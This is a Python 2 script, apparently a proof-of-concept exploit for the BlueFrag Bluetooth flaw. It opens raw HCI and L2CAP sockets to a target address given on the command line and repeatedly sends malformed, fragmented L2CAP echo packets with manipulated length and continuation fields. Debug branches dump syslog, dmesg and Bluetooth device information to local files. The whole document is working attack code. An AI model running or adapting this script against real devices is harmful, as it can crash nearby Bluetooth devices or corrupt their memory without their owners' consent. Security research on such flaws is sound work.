import sys
import os, signal
import subprocess
import socket
import struct
import time
from binascii import hexlify, unhexlify
from thread import start_new_thread
from thread import get_ident
from random import randint, randrange

def recv_l2cap():
    global l2cap
    global echo
    global pid_l2cap
    pid_l2cap = get_ident()
    while True:
        pkt = l2cap.recv(1024)
        if ord(pkt[0]) == 0x9: #ECHO RESP
            echo = True
            print "ECHO", hexlify(pkt)
        else:
            print hexlify(pkt)

handle = 0 #coonection handle
def recv_hci():
    global handle
    global pid_hci
    pid_hci = get_ident()
    while True:
        pkt = hci.recv(1024)
        if ord(pkt[0]) == 0x04 and ord(pkt[1]) == 0x03:
            if handle == 0:
                handle = struct.unpack("<H", pkt[4:6])[0]
                print "Got connection handle", handle

            print "HCI", hexlify(pkt)

#print "Parse proccess Id"
#a = raw_input()

hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
hci.setsockopt(socket.SOL_HCI, socket.HCI_DATA_DIR,1)
hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00')
hci.bind((0,))
pid_hci = 0
start_new_thread(recv_hci, ())

#l2cap.listen(0)
#conn, addr = 0, 0
#conn, addr = l2cap.accept()
#print "Connection: ", conn
#print "Address: ", addr

connect_response = -1
pid_l2cap = 0
while connect_response != 0:
    l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
    connect_response = l2cap.connect_ex((sys.argv[1], 0))
    if (connect_response != 0):
        print "Error. Response code: ", connect_response
        l2cap.close()

#os.system("netstat -a -p > ~/BlueFrag_PoC/netstat-log.txt")
if len(sys.argv) > 4:
	debug_iter = int(sys.argv[4], 0)
	output = subprocess.check_output("pgrep python", shell = True)
	os.system("lsof -p " + str(output) + " > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-lsof-cur.txt")

while handle == 0:
    pass

start_new_thread(recv_l2cap, ())

def send_echo_hci(ident, x, l2cap_len_adj=0, continuation_flags=0):
    l2cap_hdr = struct.pack("<BBH",0x8, ident, len(x) + l2cap_len_adj) #command identifier len
    acl_hdr = struct.pack("<HH", len(l2cap_hdr) + len(x) + l2cap_len_adj, 1) #len cid

    packet_handle = handle
    packet_handle |= continuation_flags << 12
    hci_hdr = struct.pack("<HH", packet_handle, len(acl_hdr) + len(l2cap_hdr) + len(x)) #handle, len

    hci.send("\x02" + hci_hdr + acl_hdr + l2cap_hdr + x)

if len(sys.argv) > 3:
    dst_l = int(sys.argv[2], 0)
    src_l = int(sys.argv[3], 0)
else:
    src_l = 70
    dst_l = 70

#a = raw_input("Check socket")
send_echo_hci(0, "A"*(32))
i = 1
echo = False
while not echo:
    send_echo_hci(i  , "A"*(dst_l), l2cap_len_adj=2)
    send_echo_hci(i+1, "A"*(src_l), continuation_flags=1)
    time.sleep(0.1)

    i = (i+1) % 250
    print "INQ: %d", i

if len(sys.argv) > 4:
	os.system("sudo lsof -u root > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-lsof-all.txt")
	os.system("sudo dmesg > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-dmesg.txt")
	os.system("hciconfig -a > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-hciconfig.txt")
	os.system("bluetoothctl show > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-bluetoothctl-show.txt")
	os.system("bluetoothctl devices > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-bluetoothctl-devices.txt")
	os.system("bluetoothctl info 80:1D:00:33:D8:82 > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-bluetoothctl-info.txt")
	os.system("sudo cat /var/log/syslog > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-syslog.txt")
l2cap.close()
hci.close()
time.sleep(2)
#raw_input("Done")

